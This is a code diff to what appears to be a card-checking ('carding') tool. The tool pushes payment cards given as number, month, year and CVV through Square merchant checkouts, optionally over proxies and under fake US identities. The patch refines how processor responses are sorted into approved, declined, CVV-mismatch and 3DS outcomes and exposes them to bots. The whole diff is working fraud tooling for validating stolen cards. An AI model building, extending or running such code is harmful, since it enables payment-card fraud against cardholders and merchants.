@@ -608,22 +608,127 @@ def parse_response(data: Dict) -> Tuple[str, str]:
     return "UNKNOWN", str(data)[:200]
 
 
-def _extract_result(result) -> Tuple[str, str]:
-    if result is None:
-        return "UNKNOWN", "No response"
+def _dig_keys(obj, keys, depth=0):
+    """Depth-first search for the first non-empty value of any key in `keys`."""
+    if depth > 4 or not isinstance(obj, dict):
+        return None
+    for k in keys:
+        v = obj.get(k)
+        if v not in (None, ""):
+            return v
+    for v in obj.values():
+        if isinstance(v, dict):
+            found = _dig_keys(v, keys, depth + 1)
+            if found is not None:
+                return found
+    return None
+
+
+def _status_group(code: str) -> str:
+    """Friendly bucket of a REAL processor code (never replaces the code)."""
+    c = (code or "").upper()
+    if not c:
+        return "UNKNOWN"
+    if "VERIFICATION_REQUIRED" in c or "3DS" in c or "AUTHENTICATION" in c:
+        return "3DS_REQUIRED"
+    if "EXPIRED" in c or "EXPIRATION" in c:
+        return "EXPIRED_CARD"
+    if "INSUFFICIENT" in c:
+        return "INSUFFICIENT_FUNDS"
+    if "CVV" in c or "SECURITY_CODE" in c:
+        return "CVV_MISMATCH"
+    if "PAN_FAILURE" in c or "INVALID_PAN" in c or "INVALID_CARD" in c:
+        return "INVALID_CARD"
+    if "GENERIC_DECLINE" in c or "DECLINE" in c or "TRANSACTION_LIMIT" in c \
+       or "CARD_VELOCITY" in c or "ADDRESS_VERIFICATION" in c:
+        return "DECLINED"
+    if "BAD_REQUEST" in c or "INVALID_REQUEST" in c or "RATE_LIMITED" in c:
+        return "ERROR"
+    return c  # unknown → group IS the real code
+
+
+def _extract_result(result) -> Dict[str, Any]:
+    """v4.2.1 — status/response are based on the REAL processor response code.
+
+    - status       = the processor's REAL code verbatim
+                     (CARD_DECLINED_VERIFICATION_REQUIRED, GENERIC_DECLINE,
+                     CARD_DECLINED_EXPIRED_CARD, ...) or APPROVED on success
+    - status_group = friendly bucket (3DS_REQUIRED / DECLINED / EXPIRED_CARD ...)
+    - response     = the processor's own detail/message verbatim
+    - error_code   = the same real code (for bots)
+    - http_status  = real HTTP status of the final checkout POST (200/422/...)
+    - three_ds     = {three_ds_transaction_status, three_ds_issuer_challenged}
+    """
+    out: Dict[str, Any] = {"status": "UNKNOWN", "status_group": "UNKNOWN",
+                           "response": "No response", "error_code": "",
+                           "http_status": None, "three_ds": {}}
+    if not isinstance(result, dict):
+        return out
+    out["http_status"] = result.get("status_code")
+
+    # ── infra / session error string path (Steps 1-11) ──
     if result.get("error"):
-        err_str = result.get("error", "Unknown error")
-        for code, mapped in [("PAN_FAILURE","INVALID_CARD"),("INVALID_PAN","INVALID_CARD"),
-            ("EXPIRED_CARD","EXPIRED_CARD"),("EXPIRATION_FAILURE","EXPIRED_CARD"),
-            ("INSUFFICIENT_FUNDS","INSUFFICIENT_FUNDS"),("CVV_FAILURE","CVV_MISMATCH"),
-            ("GENERIC_DECLINE","DECLINED"),("TRANSACTION_LIMIT","DECLINED"),
-            ("CARD_VELOCITY","DECLINED"),("CARD_DECLINED_VERIFICATION_REQUIRED","3DS_REQUIRED"),
-            ("BAD_REQUEST","ERROR"),("RATE_LIMITED","ERROR")]:
-            if code in err_str:
-                return mapped, err_str[:200]
-        return "ERROR", err_str[:200]
-    data = result.get("data", {})
-    return parse_response(data)
+        err = str(result.get("error", "Unknown error"))
+        m = re.search(r"\b([A-Z][A-Z0-9_]{4,})\b", err)
+        code = m.group(1) if m else ""
+        out.update(status=(code or "ERROR"),
+                   status_group=(_status_group(code) if code else "ERROR"),
+                   response=err[:300], error_code=code)
+        return out
+
+    data = result.get("data") if isinstance(result.get("data"), dict) else {}
+    if not data:
+        return out
+    # 3DS indicators — wherever Square nested them in the body
+    out["three_ds"] = {
+        "three_ds_transaction_status": _dig_keys(data, ["three_ds_transaction_status"]),
+        "three_ds_issuer_challenged": _dig_keys(data, ["three_ds_issuer_challenged"]),
+    }
+
+    def _first_err(d: Dict) -> Optional[Dict]:
+        errs = d.get("errors") or []
+        if errs and isinstance(errs[0], dict):
+            return errs[0]
+        cd = ((d.get("payment") or {}).get("card_details") or {})
+        errs2 = cd.get("errors") or []
+        if errs2 and isinstance(errs2[0], dict):
+            return errs2[0]
+        return None
+
+    err0 = _first_err(data)
+    if err0:
+        code = str(err0.get("code") or "").strip()
+        detail = str(err0.get("detail") or err0.get("message") or "").strip()
+        out.update(status=(code or "UNKNOWN"),
+                   status_group=_status_group(code),
+                   response=(detail or (f"Processor code: '{code}'" if code
+                                        else "Unknown processor error")),
+                   error_code=code)
+        return out
+
+    payment = data.get("payment") or {}
+    pay_status = str(payment.get("status") or "").upper()
+    if pay_status in ("COMPLETED", "CAPTURED", "AUTHORIZED", "APPROVED"):
+        out.update(status="APPROVED", status_group="APPROVED",
+                   response=f"Payment ID: {payment.get('id', '')}")
+        return out
+    if pay_status == "FAILED":
+        out.update(status="GENERIC_DECLINE", status_group="DECLINED",
+                   response=f"Payment failed with status: {pay_status}",
+                   error_code="GENERIC_DECLINE")
+        return out
+    if data.get("status") == "SUCCESS":
+        out.update(status="APPROVED", status_group="APPROVED", response="Payment successful")
+        return out
+    msg = str(data.get("message") or "")
+    if msg:
+        code = "SESSION_EXPIRED" if ("not found" in msg or "could not be found" in msg) else ""
+        out.update(status=(code or "UNKNOWN"),
+                   status_group=("SESSION_EXPIRED" if code else "UNKNOWN"),
+                   response=msg[:300], error_code=code)
+        return out
+    out["response"] = str(data)[:300]
+    return out
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1199,24 +1304,14 @@ def check_one_sync(card_str: str, site_url: str, proxy: Optional[str] = None,
     finally:
         try: asyncio.set_event_loop(asyncio.new_event_loop())
         except: pass
-    status, message = _extract_result(raw)
+    x = _extract_result(raw)
     elapsed = time.time() - start
     raw_dict = raw if isinstance(raw, dict) else {}
-    # v4.2.1 — surface the REAL processor error code (top-level, for bots)
-    real_code = ""
-    try:
-        rdata = raw_dict.get("data") or {}
-        errs = rdata.get("errors") or []
-        if not errs:
-            cd_ = ((rdata.get("payment") or {}).get("card_details") or {})
-            errs = cd_.get("errors") or []
-        if errs and isinstance(errs[0], dict):
-            real_code = str(errs[0].get("code", "") or "")
-    except Exception:
-        real_code = ""
-    return {"status": status, "card": f"{cc}|{mes}|{ano}|{cvv}", "card_brand": _card_brand(cc),
+    return {"status": x["status"], "status_group": x["status_group"],
+            "card": f"{cc}|{mes}|{ano}|{cvv}", "card_brand": _card_brand(cc),
             "price": f"${amount_cents/100:.2f}", "elapsed": round(elapsed, 2), "time": _iso_now(),
-            "response": message, "error_code": real_code,
+            "response": x["response"], "error_code": x["error_code"],
+            "http_status": x["http_status"], "three_ds": x.get("three_ds", {}),
             "site": site_url, "merchant_id": merchant_id,
             "checkout_id": checkout_id, "email": email or "", "amount_cents": amount_cents,
             # v4.2 — the REAL US identity (fakenamegenerator.com) used for this charge
